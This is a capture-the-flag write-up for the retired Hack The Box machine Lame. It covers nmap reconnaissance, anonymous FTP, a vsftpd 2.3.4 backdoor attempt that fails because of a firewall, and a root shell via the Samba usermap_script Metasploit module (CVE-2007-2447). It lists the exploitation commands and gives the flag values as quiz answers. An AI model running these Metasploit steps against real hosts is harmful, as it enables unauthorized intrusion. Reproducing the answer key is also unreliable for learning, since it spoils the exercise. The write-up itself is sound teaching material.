<div align="center">

# 🖥️ Hack The Box — Lame

### From Anonymous FTP to Root Shell via Samba RCE

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Status](https://img.shields.io/badge/Status-Owned-success)
![CVE](https://img.shields.io/badge/CVE-2007--2447-red)

`Target IP: 10.129.199.110`

</div>

---

## 📋 Table of Contents

- [Introduction](#-introduction)
- [1. Reconnaissance — Nmap Scan](#1-reconnaissance--nmap-scan)
- [2. FTP Enumeration](#2-ftp-enumeration)
- [3. The VSFTPd 2.3.4 Rabbit Hole](#3-the-vsftpd-234-rabbit-hole)
- [4. Pivoting to Samba](#4-pivoting-to-samba)
- [5. Exploitation via Metasploit](#5-exploitation-via-metasploit)
- [6. Capturing the Flags](#6-capturing-the-flags)
- [Quiz / Q&A Recap](#-quiz--qa-recap)
- [Key Takeaways](#-key-takeaways)
- [Further Reading](#-further-reading)

---

## 🎯 Introduction

**Lame** is one of the classic beginner-friendly machines on Hack The Box. Despite its age, it's a great teaching tool — not just for exploitation mechanics, but for understanding *why* an exploit can fail and how to pivot when your first approach doesn't pan out.

This writeup covers full enumeration, a documented rabbit hole (and why it fails), and the final path to root via a well-known Samba vulnerability.

> ⚠️ **Disclaimer:** This writeup documents a retired, intentionally vulnerable Hack The Box machine. Only test systems you own or are explicitly authorized to assess.

---

## 1. Reconnaissance — Nmap Scan

We start with a default Nmap script scan to enumerate open ports and running services:

```bash
nmap -sC 10.129.199.110
```

### Results

| Port | State | Service       |
|------|-------|---------------|
| 21   | open  | ftp           |
| 22   | open  | ssh           |
| 139  | open  | netbios-ssn   |
| 445  | open  | microsoft-ds  |

Out of Nmap's top 1000 TCP ports, only **4** are open — a small, focused attack surface.

The script scan immediately flags something interesting: **anonymous FTP login is allowed.** 🚩

---

## 2. FTP Enumeration

Anonymous access is worth checking first:

```bash
ftp anonymous@10.129.199.110
```

When prompted for a password, just press **Enter** (empty password).

**Result:** We're in — but the FTP server has no accessible directory listing. Dead end, for now.

However, the banner reveals the FTP daemon version:

```
VSFTPd 2.3.4
```

That version number should immediately ring a bell for anyone who has spent time around HTB or OSCP-style boxes.

---

## 3. The VSFTPd 2.3.4 Rabbit Hole

VSFTPd 2.3.4 has a notorious backdoor vulnerability, complete with a ready-made Metasploit module:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

### Attempting the exploit

```bash
msfconsole

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.129.199.110
set LHOST <your_tun0_ip>
run
```

### ❌ Result: Failure

The exploit fails — it prompts for a username and password instead of dropping a shell, meaning the backdoor isn't responding as expected.

### Why did it fail?

The VSFTPd backdoor works by spawning a listening shell on **port 6200**. On Lame, the backdoor *does* trigger, and port 6200 *does* start listening — but a firewall blocks external connections to that port. Running `netstat -tnlp` from a root shell later confirms plenty of ports are listening internally; they're simply unreachable from the outside.

> 💡 **Lesson:** Always consider firewall filtering when an exploit *should* work but doesn't. The vulnerability can still be present — just blocked at the network layer. Don't abandon a lead without understanding *why* it failed.

---

## 4. Pivoting to Samba

With FTP exhausted, attention turns to the SMB ports (**139** and **445**). The Nmap scan reveals the Samba version:

```
Samba 3.0.20
```

A quick search turns up **CVE-2007-2447** — a critical remote code execution vulnerability affecting this exact version.

### What is CVE-2007-2447?

Per the official Samba security advisory, this flaw allows remote attackers to execute arbitrary commands via shell metacharacters involving the `SamrChangePassword` MS-RPC function when the `username map script` option is enabled in `smb.conf`. It also allows remote *authenticated* users to execute commands via shell metacharacters in other MS-RPC functions related to remote printer and file share management

### What is "username map script"?

The `username map` option in Samba translates Windows usernames to Unix usernames (and vice versa). This exists because:

- Linux filesystems are case-sensitive
- Linux usernames don't allow spaces
- Windows usernames may contain both

When Samba passes a username containing shell metacharacters (like backticks `` ` `` or `$()`) through this mapping *without proper sanitization*, the result is arbitrary command execution.

---

## 5. Exploitation via Metasploit

Search for the relevant module:

```bash
searchsploit usermap
```

Then exploit **CVE-2007-2447** using the `usermap_script` module:

```bash
msfconsole

use exploit/multi/samba/usermap_script
set RHOSTS 10.129.199.110
set LHOST <your_tun0_ip>
run
```

### ✅ Result: Root Shell

The exploit returns a shell as **root** — no privilege escalation required.

---

## 6. Capturing the Flags

With a root shell in hand, both flags are trivial to grab.

**User flag** (`makis`):

```bash
cat /home/makis/user.txt
```
```
11b8161471d76ccef2623d45075b0cf5
```

**Root flag:**

```bash
cat /root/root.txt
```
```
b958ddf26cb2899d740c780a9be2d3d3
```

---

## ❓ Quiz / Q&A Recap

| # | Question | Answer |
|---|----------|--------|
| 1 | How many of the Nmap top 1000 TCP ports are open? | **4** |
| 2 | What version of VSFTPd is running? | **vsftpd 2.3.4** |
| 3 | Does the VSFTPd backdoor exploit work? | **No — it asks for credentials** |
| 4 | What version of Samba is running? | **Samba 3.0.20** |
| 5 | What 2007 CVE allows RCE via shell metacharacters? | **CVE-2007-2447** |
| 6 | Exploiting CVE-2007-2447 returns a shell as which user? | **root** |
| 7 | User flag (makis home directory) | `11b8161471d76ccef2623d45075b0cf5` |
| 8 | Root flag | `b958ddf26cb2899d740c780a9be2d3d3` |
| 9 | What is blocking connections to the internal ports? | **A firewall** |
| 10 | What port does the VSFTPd backdoor open? | **6200** |
| 11 | Does port 6200 start listening when the backdoor triggers on Lame? | **Yes** |

---

## 🔑 Key Takeaways

- **Enumeration is everything.** Nmap's `-sC` flag handed us the FTP version and anonymous access in a single pass.
- **Don't abandon rabbit holes without understanding why they failed.** The VSFTPd backdoor *is* triggered, but a firewall blocks the connection — a subtlety that matters a lot in real engagements.
- **Samba misconfigurations are dangerous.** The `username map script` option in `smb.conf` turned a legacy compatibility feature into full unauthenticated RCE.

---

## 📚 Further Reading

- 📄 [CVE-2007-2447 Official Advisory](https://www.samba.org/samba/security/CVE-2007-2447.html)
- 📝 [0xdf's HTB Lame Writeup](https://0xdf.gitlab.io/2020/04/07/htb-lame.html)

---

<div align="center">

*Happy hacking — and remember to always test on boxes you own or have explicit permission to assess.* 🛡️

</div>
